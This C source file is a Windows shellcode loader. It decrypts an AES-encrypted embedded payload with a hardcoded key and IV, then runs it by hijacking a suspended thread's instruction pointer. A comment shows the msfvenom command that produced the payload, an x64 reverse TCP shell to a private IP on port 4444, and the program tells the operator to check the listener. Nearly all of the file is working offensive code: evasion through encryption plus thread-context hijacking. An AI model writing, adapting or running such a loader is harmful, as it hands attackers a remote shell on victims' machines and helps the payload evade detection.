#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data
    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it
    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
} AES, * PAES;

BOOL InstallAesDecryption(PAES pAes) {
    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        printf("[!] Unexpected block size: %d\n", dwBlockSize);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] HeapAlloc for key object failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        printf("[!] HeapAlloc for plaintext failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

VOID DummyFunction() {
    // Placeholder function for the suspended thread
    Sleep(INFINITE);
}

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    DWORD dwOldProtection = 0;
    CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_CONTROL };

    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    ThreadCtx.Rip = (DWORD64)pAddress;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    return TRUE;
}

int main() {
	// msfvenom -p /windows/x64/shell_reverse_tcp LHOST=192.168.152.132 LPORT=4444 EXITFUNC=thread -f raw -o reverse.bin
    unsigned char AesCipherText[] = {
        0xC9, 0xF5, 0x2D, 0x65, 0x95, 0x69, 0xCD, 0x71, 0x70, 0x34, 0xA9, 0x25, 0x42, 0xA6, 0xF9, 0x4F,
        0x07, 0xFF, 0xFB, 0xD9, 0x36, 0xB2, 0x60, 0xE1, 0x32, 0x03, 0x2C, 0x5E, 0xE6, 0x1B, 0x44, 0x84,
        0xE1, 0xB6, 0xE1, 0x72, 0xDB, 0x90, 0xDA, 0x3F, 0x55, 0x2B, 0x3C, 0xD3, 0x78, 0xEF, 0x08, 0x6E,
        0x8B, 0xDD, 0x51, 0xC3, 0x70, 0xD6, 0x29, 0xE4, 0x73, 0x6F, 0x65, 0x74, 0x29, 0x81, 0x78, 0x7A,
        0xE2, 0xA3, 0xBD, 0x22, 0xC6, 0xAB, 0x67, 0x7F, 0x7B, 0x5A, 0x0B, 0xB7, 0x95, 0x18, 0xE4, 0xE6,
        0x04, 0xA4, 0x2E, 0x69, 0x2E, 0xE7, 0x15, 0x2B, 0xB3, 0xF7, 0x82, 0x33, 0x4A, 0x24, 0xF3, 0xB4,
        0x53, 0xAF, 0x43, 0xC2, 0x52, 0x13, 0xEF, 0x3D, 0x48, 0x7D, 0x63, 0xAF, 0x18, 0x4F, 0xCF, 0x26,
        0x1F, 0x8F, 0xBF, 0xBD, 0x19, 0xF7, 0xAC, 0x60, 0xDA, 0x80, 0xD4, 0x1A, 0x16, 0xB3, 0x7A, 0xEF,
        0xBA, 0x2B, 0xF1, 0x1D, 0x60, 0xB0, 0x27, 0xAE, 0xA7, 0xEC, 0x15, 0x85, 0xBD, 0xD4, 0x8E, 0xB1,
        0xF1, 0xCF, 0x59, 0x8D, 0xA0, 0x73, 0x45, 0x28, 0xF7, 0x2C, 0x80, 0xFC, 0x8E, 0xD6, 0x1D, 0xE9,
        0x97, 0xA5, 0x87, 0x50, 0xDA, 0x68, 0x0A, 0x3B, 0x02, 0x74, 0x95, 0xF6, 0x94, 0xA0, 0xD1, 0x83,
        0xCD, 0xBD, 0x90, 0xAA, 0x41, 0x4C, 0xC9, 0xD8, 0x48, 0x44, 0xF2, 0xE5, 0xBD, 0x6A, 0xAE, 0xD2,
        0xF2, 0xC3, 0x37, 0xF5, 0x3A, 0xAC, 0x1B, 0x18, 0x12, 0x49, 0x37, 0xA5, 0x38, 0x45, 0x9B, 0x3A,
        0xB6, 0x0D, 0x37, 0xC0, 0xAC, 0x84, 0x01, 0x3A, 0xF5, 0x94, 0x95, 0x62, 0x55, 0xA9, 0x1F, 0x1F,
        0x43, 0x0B, 0x21, 0x1C, 0x14, 0x9F, 0x55, 0x72, 0x47, 0x8C, 0xAE, 0xC4, 0x70, 0xA4, 0x18, 0x39,
        0x46, 0x23, 0x50, 0xE5, 0x1D, 0x24, 0x4A, 0xA8, 0x00, 0x84, 0xEC, 0xD4, 0x84, 0x08, 0x68, 0xB8,
        0xD7, 0xA2, 0xA9, 0xD5, 0x04, 0x0D, 0x5E, 0xE1, 0xEA, 0x38, 0xBD, 0xFD, 0x5C, 0x25, 0x31, 0xAA,
        0xF9, 0x3B, 0x9A, 0x5E, 0x03, 0xD6, 0xCA, 0xCA, 0x33, 0x24, 0x3C, 0xE2, 0x2D, 0xA6, 0xA5, 0x48,
        0x13, 0xCB, 0xA6, 0xCF, 0x02, 0x7A, 0x04, 0x2F, 0x8A, 0x80, 0x80, 0x08, 0x77, 0x25, 0x19, 0xB0,
        0x01, 0x1B, 0xDC, 0x34, 0xDC, 0xB6, 0x93, 0x76, 0x47, 0xE3, 0x7A, 0x39, 0xC4, 0xDD, 0xE7, 0x8F,
        0x0D, 0xBA, 0xEA, 0xE0, 0x58, 0x7F, 0x49, 0x79, 0x1D, 0x0F, 0x24, 0x09, 0x60, 0x0D, 0x4F, 0xDC,
        0x57, 0xE0, 0x2B, 0x5D, 0xCD, 0x46, 0x16, 0x7C, 0x26, 0x90, 0xBC, 0x46, 0xB6, 0x7B, 0x47, 0x0C,
        0x06, 0xBC, 0xD5, 0x79, 0xFE, 0x5D, 0xA4, 0x75, 0xF2, 0x88, 0x24, 0x25, 0x83, 0x48, 0xD2, 0x2D,
        0x39, 0x93, 0x46, 0x6D, 0x87, 0xA8, 0x71, 0xF4, 0x19, 0x66, 0x12, 0x72, 0x78, 0x44, 0x74, 0x94,
        0x21, 0xEC, 0xCD, 0x24, 0x46, 0x97, 0xAE, 0x78, 0xC1, 0x4F, 0x9D, 0x14, 0x9C, 0xB8, 0xB1, 0xFB,
        0x52, 0xDE, 0xC5, 0xA2, 0x04, 0x97, 0xD1, 0xD7, 0xAB, 0x7B, 0xD0, 0x49, 0x85, 0x11, 0x71, 0x80,
        0x50, 0x71, 0xFB, 0x6B, 0x67, 0x38, 0xBB, 0x49, 0x01, 0x55, 0x75, 0x32, 0x6B, 0x76, 0x36, 0x31,
        0x57, 0xE8, 0xE8, 0xF7, 0x91, 0xEB, 0x99, 0x1A, 0x16, 0xAA, 0xDC, 0x3A, 0x4B, 0xD8, 0xCB, 0xDD,
        0x76, 0xF3, 0x87, 0xC2, 0x99, 0x5C, 0xEA, 0xBA, 0x11, 0xA4, 0x29, 0x5C, 0xF1, 0x56, 0x01, 0x53 };


    unsigned char AesKey[] = {
            0x86, 0x08, 0x0C, 0xD3, 0xB7, 0x51, 0xE3, 0x80, 0x5C, 0x9E, 0x87, 0x2F, 0xC0, 0x5F, 0xBD, 0x5E,
            0xF9, 0xA3, 0x69, 0x37, 0x1A, 0x7D, 0x5D, 0x12, 0xAA, 0xAD, 0x6F, 0x3A, 0x55, 0x7C, 0xCE, 0xF4 };


    unsigned char AesIv[] = {
            0xDF, 0x11, 0x1E, 0xFB, 0x84, 0xFC, 0x0E, 0x59, 0x25, 0x2C, 0x84, 0x26, 0x74, 0x5B, 0xE3, 0x87 };

    PVOID pPlainText = NULL;
    DWORD sPlainTextSize = 0;

    if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlainText, &sPlainTextSize)) {
        printf("[!] Decryption failed!\n");
        return -1;
    }

    printf("[*] Decryption successful! Plaintext size: %lu bytes\n", sPlainTextSize);
    printf("[*] Plaintext (first 16 bytes in hex): ");
    for (DWORD i = 0; i < min(sPlainTextSize, 16); i++) {
        printf("%02X ", ((PBYTE)pPlainText)[i]);
    }
    printf("\n");

    printf("[*] Press Enter to Perform Local Thread Hijacking \n");
    getchar();

    printf("[*] Creating Sacrificial Thread and Perform Local Thread Hijacking! CHECK YOUR LISTENER!! \n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pPlainText);
        return -1;
    }

    if (!RunViaClassicThreadHijacking(hThread, (PBYTE)pPlainText, sPlainTextSize)) {
        printf("[!] Thread hijacking failed!\n");
        CloseHandle(hThread);
        HeapFree(GetProcessHeap(), 0, pPlainText);
        return -1;
    }

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    HeapFree(GetProcessHeap(), 0, pPlainText);

    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
